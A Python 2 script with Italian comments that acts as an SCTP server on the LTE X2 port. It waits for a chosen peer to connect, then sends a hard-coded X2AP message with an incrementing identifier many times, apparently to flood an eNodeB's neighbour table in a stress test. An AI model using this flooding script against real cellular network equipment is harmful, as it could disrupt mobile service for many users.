#!/usr/bin/env python

import sctp
import binascii
import sys, socket
import time, IPy
from itertools import repeat
#per provare in locale: sudo ncat --sctp -l -p 36422

#interface 3GPP S1-MME

#verifcare se i seguenti moduli sono caricati
#sudo insmod /lib/modules/3.6.11-4.fc16.i686/kernel/lib/libcrc32c.ko
#sudo insmod /lib/modules/3.6.11-4.fc16.i686/kernel/net/sctp/sctp.ko

#echo 1 > /proc/sys/net/sctp/max_init_retransmits

def usage():
    print "usage : python x2_table_flood_server.py <dst ip > <num_msg> <local_ip> offset"
    exit(0)

if len(sys.argv) < 3 :
    usage()
    exit(0)

dest_ip = sys.argv[1]

num_msg = int(sys.argv[2])
if num_msg == 0:
  
    num_msg = 100
    
ip = IPy.IP(sys.argv[3])
local_ip = (ip.strNormal(0), 36422)
    
offset = 1
if len(sys.argv) > 4 :
    offset = int(sys.argv[4])
payload = "0006008ac9000004001500080022f21000%04x1000140089cd054000050022f210f4241015926022f210004c2c05dc55002e0022f210f4242010000105dc0022f210f4242020000005dc0022f210f4242030000205dc0022f210dbedd02000f505dc0022f210dbedd01000f305dc0022f210dbe7f010006005dc0022f210dbe7f030006105dc0022f210dbcd702000ac05dc0022f210dbea8040017b05dc0022f210dbd30020011105dc0022f210dbd30030011305dc0022f210dbf91010002905dc0022f210dbd81020007705dc0022f210dbcb5040003605dc0022f210dbf7f03000e105dc0022f210dbe7f060006105dc0022f210dbc23040010705dc0022f210dbc23050010505dc0022f210dbf7f02000e305dc0022f210dbcb901001e605dc0022f210dbe7f040006005dc0022f210dbcac01001b705dc0022f210dbe7f050006205dc0022f210f424204000050c670022f210f424205000030c670022f210f424206000040c670022f210dbd540100113189c0022f210dbd540200112189c0022f210dbd540300111189c0022f210dbc230100149189c0022f210dbc230200147189c0022f210dbcd50200193189c0022f210dbc4602001bf189c0022f210dbea8010018e189c0022f210dbeb40300092189c0022f210dbdaf01001cc189c0022f210dbd55010010c189c0022f210dbd55020010b189c0022f210dbd55030010d189c0022f210dbe5a010013a189c0022f210dbcb5010012b189c0022f210dbe7f0100162189c0022f210dbe7f0300163189c0022f210dbe66020005a189c0022f210dbcd50300194189c0022f210dbedb0300150189c4000040022f210f4241025926022f210004c2c05dc55001f0022f210f4242020000005dc0022f210f4242010000105dc0022f210f4242030000205dc0022f210dbd30030011305dc0022f210dbcac01001b705dc0022f210dbea8040017b05dc0022f210dbf7f03000e105dc0022f210dbc23050010505dc0022f210dbea8050017a05dc0022f210f424204000050c670022f210f424205000030c670022f210f424206000040c670022f210dbd540100113189c0022f210dbd540200112189c0022f210dbd540300111189c0022f210dbc230200147189c0022f210dbeb40100090189c0022f210dbeb40200091189c0022f210dbeb40300092189c0022f210dbeec01000e0189c0022f210dbdaf01001cc189c0022f210dbdaf02001cb189c0022f210dbdaf03001cd189c0022f210dbd55010010c189c0022f210dbd55020010b189c0022f210dbd55030010d189c0022f210dbdac0200172189c0022f210dbea8020018d189c0022f210dbea8010018e189c0022f210dbcd50300194189c0022f210dbe1302001bc189c4000030022f210f4241035926022f210004c2c05dc5500290022f210f4242010000105dc0022f210f4242030000205dc0022f210f4242020000005dc0022f210dbedd02000f505dc0022f210dbedd01000f305dc0022f210dbcd702000ac05dc0022f210dbd30030011305dc0022f210dbd4202000b105dc0022f210dbf7f03000e105dc0022f210dbca3010010b05dc0022f210dbca3030010d05dc0022f210dbea8040017b05dc0022f210f424204000050c670022f210f424205000030c670022f210f424206000040c670022f210dbd540100113189c0022f210dbd540200112189c0022f210dbd540300111189c0022f210dbe9003001e7189c0022f210dbc4602001bf189c0022f210dbc4603001c0189c0022f210dbcb90400196189c0022f210dbe1303001bd189c0022f210dbea8030018c189c0022f210dbe3201001d4189c0022f210dbedc010009a189c0022f210dbedb0300150189c0022f210dbe7903000ae189c0022f210dbcd705000ee189c0022f210dbd55010010c189c0022f210dbe5a010013a189c0022f210dbe66010005b189c0022f210dbdaf01001cc189c0022f210dbea8010018e189c0022f210dbe66030005c189c0022f210dbd55020010b189c0022f210dbe5a0300139189c0022f210dbcd704000ed189c0022f210dbdaf03001cd189c0022f210dbe66020005a189c0022f210dbe5a0200138189c4000090022f210f4241045926022f2100052b70c6744001a0022f210f424204000050c670022f210f424205000030c670022f210f424206000040c670022f210f4242010000105dc0022f210f4242020000005dc0022f210f4242030000205dc0022f210dbd30020011105dc0022f210dbcd702000ac05dc0022f210dbf7f03000e105dc0022f210dbea8040017b05dc0022f210dbf91010002905dc0022f210dbd540100113189c0022f210dbd540200112189c0022f210dbd540300111189c0022f210dbc230100149189c0022f210dbc230200147189c0022f210dbcd50200193189c0022f210dbc4602001bf189c0022f210dbea8010018e189c0022f210dbeb40300092189c0022f210dbdaf01001cc189c0022f210dbd55010010c189c0022f210dbd55020010b189c0022f210dbd55030010d189c0022f210dbe5a010013a189c0022f210dbe7f0100162189c40000b0022f210f4241055926022f2100052b70c674400180022f210f424204000050c670022f210f424205000030c670022f210f424206000040c670022f210f4242010000105dc0022f210f4242030000205dc0022f210f4242020000005dc0022f210dbea8040017b05dc0022f210dbf7f03000e105dc0022f210dbd540100113189c0022f210dbd540200112189c0022f210dbd540300111189c0022f210dbc230200147189c0022f210dbeb40100090189c0022f210dbeb40200091189c0022f210dbeb40300092189c0022f210dbeec01000e0189c0022f210dbdaf01001cc189c0022f210dbdaf02001cb189c0022f210dbdaf03001cd189c0022f210dbd55010010c189c0022f210dbd55020010b189c0022f210dbd55030010d189c0022f210dbdac0200172189c0022f210dbea8010018e189c40000a0022f210f4241065926022f2100052b70c6744001d0022f210f424204000050c670022f210f424205000030c670022f210f424206000040c670022f210f4242010000105dc0022f210f4242020000005dc0022f210f4242030000205dc0022f210dbcd702000ac05dc0022f210dbd540100113189c0022f210dbd540200112189c0022f210dbd540300111189c0022f210dbe9003001e7189c0022f210dbc4602001bf189c0022f210dbc4603001c0189c0022f210dbcb90400196189c0022f210dbe1303001bd189c0022f210dbea8030018c189c0022f210dbe3201001d4189c0022f210dbedb0300150189c0022f210dbe7903000ae189c0022f210dbd55030010d189c0022f210dbd55010010c189c0022f210dbe5a0300139189c0022f210dbd55020010b189c0022f210dbdaf03001cd189c0022f210dbe66010005b189c0022f210dbe5a010013a189c0022f210dbdaf01001cc189c0022f210dbe66030005c189c0022f210dbe66020005a189c001800060022f210801400c84080d90b0022f210f4241010f80a0a010a000001f4100022f210f4241020f80a0a010b000001f4100022f210f4241030f80a0a010c000001f4100022f210f4241040f80a0a010d000001f4100022f210f4241050f80a0a010e000001f4100022f210f4241060f80a0a010f000001f4100022f210f4241070f80a0a0110000001f4100022f210f4241080f80a0a0111000001f4100022f210f4241090f80a0a0112000001f4100022f210f42410a0f80a0a0113000001f4100022f210f42410b0f80a0a0114000001f4100022f210f42410c0f80a0a0115000001f410"
    
s = sctp.sctpsocket_tcp(socket.AF_INET)
s.bind(local_ip)
s.listen(1)
while 1 :
    opened_conn, client_address = s.accept()
    if dest_ip == client_address[0] :
        break
opened_conn.settimeout(5)



end = offset + num_msg

for i in xrange(offset, end):
    data = binascii.unhexlify(payload%(i))
    opened_conn.send(data)
    time.sleep(1)
raw_input("premi invio per uscire ....")
s.close()
